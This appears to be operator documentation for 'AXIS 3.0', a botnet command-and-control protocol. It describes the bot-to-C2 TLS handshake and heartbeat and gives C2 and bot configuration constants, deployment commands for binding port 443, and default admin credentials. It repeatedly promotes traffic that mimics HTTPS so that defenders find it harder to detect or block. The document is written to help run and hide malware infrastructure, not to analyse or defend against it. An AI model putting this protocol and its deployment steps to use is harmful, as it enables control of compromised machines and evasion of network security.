# AXIS 3.0 - Ultra-Simplified Bot Protocol

## Overview

AXIS 3.0 uses the **absolute minimal protocol possible**:
- **TLS 1.3 encryption** on port 443 (standard HTTPS)
- **No authentication** - TLS provides security
- **1-step handshake** (just ACK)
- **Zero overhead** - pure TLS, no metadata

---

## Protocol Specification

### Connection Details

| Property | Value |
|----------|-------|
| **Transport** | TCP over TLS 1.3 |
| **Port** | 443 (HTTPS) |
| **Authentication** | None (TLS only) |
| **Handshake** | 2-byte ACK only |

---

## Handshake Flow

### Step 1: TLS Handshake
Bot initiates TLS 1.3 handshake with C2 server on port 443.

```
Bot → C2: TLS ClientHello
C2 → Bot: TLS ServerHello, Certificate, ServerHelloDone
Bot → C2: ClientKeyExchange, ChangeCipherSpec, Finished
C2 → Bot: ChangeCipherSpec, Finished
```

**TLS Configuration:**
- Minimum Version: TLS 1.3
- Cipher Suites:
  - TLS_AES_256_GCM_SHA384
  - TLS_AES_128_GCM_SHA256
  - TLS_CHACHA20_POLY1305_SHA256

---

### Step 2: Immediate ACK
C2 sends simple 2-byte ACK immediately after TLS handshake.

**Format:**
```
[ACK: 2 bytes] = [0x00, 0x01]
```

**Example:**
```
C2 → Bot: [0x00, 0x01]
```

**Bot Validation:**
- Checks for exact 2-byte ACK
- Verifies ACK bytes are `[0x00, 0x01]`
- Closes connection on invalid ACK

---

## Message Format

### Keep-Alive Messages

**Heartbeat (Bot ↔ C2):**
```
[2 bytes] - Echo for connection monitoring
```

Bot reads 2 bytes and writes them back to maintain connection.

---

## Security Features

### 1. TLS 1.3 Encryption
- All communications encrypted with AES-256-GCM or ChaCha20-Poly1305
- Perfect forward secrecy via ECDHE key exchange
- Protection against eavesdropping and MITM attacks

### 2. No Authentication Overhead
- TLS certificate provides server authentication
- No additional tokens or passwords needed
- Minimal handshake overhead

### 3. Port 443 Stealth
- Uses standard HTTPS port
- Traffic looks like normal HTTPS
- Harder to detect/block

### 4. Zero Metadata
- No architecture info
- No version information
- No source tracking
- Pure command/control traffic only

---

## Configuration

### C2 Server Configuration

In `cnc/main.go`:
```go
const CNCListenAddr string = "0.0.0.0:443"           // Bot port
const TelnetTLSListenAddr string = "0.0.0.0:6969"   // Admin port
```

### Bot Configuration

In `bot/config.h`:
```c
#define CNC_ADDR "YOUR_SERVER_IP"
#define CNC_PORT 443  // Standard HTTPS port
```

---

## Port Summary

| Service | Port | Protocol | Purpose |
|---------|------|----------|---------|
| **Bots** | 443 | TLS 1.3 | Bot connections (looks like HTTPS) |
| **Admin** | 6969 | TLS Telnet | Admin panel access |
| **API** | 3779 | HTTP | REST API (optional) |

---

## Testing the Protocol

### Manual Connection Test

```bash
# Start C2 server (requires root for port 443)
cd cnc
sudo ./cnc_server

# Test TLS connection
openssl s_client -connect localhost:443 -tls1_3

# Should receive immediate ACK: 00 01
```

### Bot Connection Test

```bash
# Start C2 server
sudo ./cnc_server

# Run bot binary
sudo ./bins/axis.x86_64

# Check C2 logs for connection
```

---

## Deployment Notes

### Port 443 Requirements

**Option 1: Run as root**
```bash
sudo ./cnc_server
```

**Option 2: Port forwarding**
```bash
# Forward 443 to alternate port
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8443
./cnc_server  # Runs on 8443
```

**Option 3: Setcap for port binding**
```bash
sudo setcap 'cap_net_bind_service=+ep' ./cnc_server
./cnc_server  # Can bind to 443 without root
```

---

## Admin Access

Connect to admin panel on port **6969**:

```bash
openssl s_client -connect YOUR_SERVER_IP:6969 -quiet

# Login: admin
# Password: admin123
```

---

## Comparison: Evolution of Protocol

| Feature | VisionC2 | Token Auth | Ultra-Simple |
|---------|----------|------------|--------------|
| **Port** | 3778 | 443 | 443 |
| **Auth** | Magic + version | Token | None |
| **Handshake** | 5 steps | 2 steps | 1 step |
| **Size** | ~50 bytes | ~25 bytes | 2 bytes |
| **Metadata** | Yes | No | No |

---

## Security Best Practices

### 1. Certificate Management
- Replace self-signed certs with valid certificates
- Use Let's Encrypt or commercial CA
- Rotate certificates regularly

### 2. Port 443 Stealth
- Looks like normal HTTPS traffic
- Use valid certificate for extra stealth
- Monitor for connection attempts

### 3. Admin Port Security
- Port 6969 is non-standard (good)
- Use strong admin passwords
- Consider IP whitelisting

### 4. Monitor Connections
- Log all connection attempts
- Track bot connection patterns
- Alert on anomalies

---

## Troubleshooting

### Connection Refused
- Check C2 server is running
- Verify port 443 is open
- Check firewall rules
- Ensure running as root or with port forwarding

### Handshake Failed
- Check TLS 1.3 is supported
- Ensure certificate is valid
- Verify bot and C2 use same TLS config

### Certificate Errors
- Delete old certificates: `rm bot_tls_*.pem`
- Restart C2 server to regenerate
- Or provide custom certificates

---

## Performance

### Overhead
- **Handshake**: ~1-2 RTT (TLS 1.3)
- **Authentication**: 0 bytes (none)
- **Total**: 2 bytes (ACK only)
- **Memory**: ~2KB per connection

### Optimization
- TLS session resumption enabled
- Keep-alive every 180 seconds
- Automatic reconnection on failure

---

## Future Enhancements

### Planned (Minimal)
- [ ] Certificate pinning
- [ ] Optional compression

### Not Planned (Bloat Removed)
- ❌ Token authentication
- ❌ Architecture reporting
- ❌ Version checking
- ❌ Metadata exchange
- ❌ Complex handshake
- ❌ Protocol negotiation

---

**AXIS 3.0 - Ultra-Simplified Bot Protocol**  
*Minimal, secure, stealthy - zero bloat*
